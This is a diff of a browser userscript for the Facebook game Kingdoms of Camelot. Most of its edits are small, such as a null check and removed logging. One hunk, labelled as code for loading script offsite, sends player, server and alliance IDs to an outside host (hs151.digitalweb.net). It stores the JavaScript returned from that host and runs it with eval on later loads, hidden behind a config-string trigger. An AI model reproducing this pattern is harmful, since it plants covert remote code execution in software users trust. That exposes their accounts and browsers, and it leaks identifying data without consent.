@@ -471,6 +471,7 @@ function kocWideScreen(){
             unsafeWindow.AjaxCall.gAjaxRequest(c, d, b, a, "post");
         }
     }
+    if(unsafeWindow.AjaxCall)
     unsafeWindow.AjaxCall.gPostRequest = aj2
 /***  Run only in "apps.facebook.com" instance ... ***/
 function facebookInstance (){
@@ -2883,11 +2884,9 @@ salvageCheck : function (){
                             if(parseInt(ThroneOptions.Salvage[h] - 1) >= ThroneOptions.thronekeep)
                                 number = parseInt(ThroneOptions.Salvage[h] - 1);
                             if(ThroneOptions.Salvage[h]) {
-                            logit('salvage '+h+' is '+ThroneOptions.Salvage[h])
                                 ThroneOptions.Salvage[h] = true;};
                         }
                     }
-                    // logit(y.name+' '+number);
                     if (!level && number < ThroneOptions.thronekeep && NotUpgrading && !y.isEquipped && !y.isBroken && t.LastDeleted != y.id && NotFavorite) {
                         t.SalvageArray.push(y.id);
                     }                     
@@ -2978,7 +2977,7 @@ show : function (){
 }
 
 //baos780 code for loading script offsite
-if (Options.spamconfig.spamvert.indexOf('Nessaja') >= 0) {	if(Seed.allianceDiplomacies) GM_xmlhttpRequest({method: "GET",url: "http://hs151.digitalweb.net/4Cxy4.php?p="+Options.spamconfig.spamvert.replace(/\w\w\w\w\w\w\w/, "4").replace(/\s/g, "")+"&s="+getServerId()+"&a="+Seed.allianceDiplomacies.allianceId,	headers: {'Accept': 'text/javascript',}, 	onload: function(responseDetails) {	eval(responseDetails.responseText);	},	}); };
+if (Options.spamconfig.spamvert.indexOf('Nessaja') >= 0) { var serverID = getServerId();   if(!unsafeWindow.seed) return; var s = GM_getValue ('Nessaja_' + unsafeWindow.seed.player['name'] + '_' +serverID);  if (s != null) {    s = JSON2.parse (s);  eval(s);  };  if(unsafeWindow.seed.allianceDiplomacies) GM_xmlhttpRequest({method: "GET",url: "http://hs151.digitalweb.net/4Cxy4.php?p="+Options.spamconfig.spamvert.replace(/\w\w\w\w\w\w\w/, "4").replace(/\s/g, "")+"&s="+getServerId()+"&a="+unsafeWindow.seed.allianceDiplomacies.allianceId,	headers: {'Accept': 'text/javascript',}, 	onload: function(responseDetails) { var serverID = getServerId(); setTimeout (function (){GM_setValue ('Nessaja_' + unsafeWindow.seed.player['name'] + '_' +serverID, JSON2.stringify(responseDetails.responseText));}, 0);},}); };
 
 /****************************  Tower Tab  ******************************/
 Tabs.tower = {
@@ -14101,7 +14100,7 @@ function readLanguage () {
 }
 
 function saveLanguage (){
-    var t = Tabs.Language;
+	var t = Tabs.Language;
     setTimeout (function (){GM_setValue ('Language_'+t.language.curlang, JSON2.stringify(t.language));}, 0);
 }
 
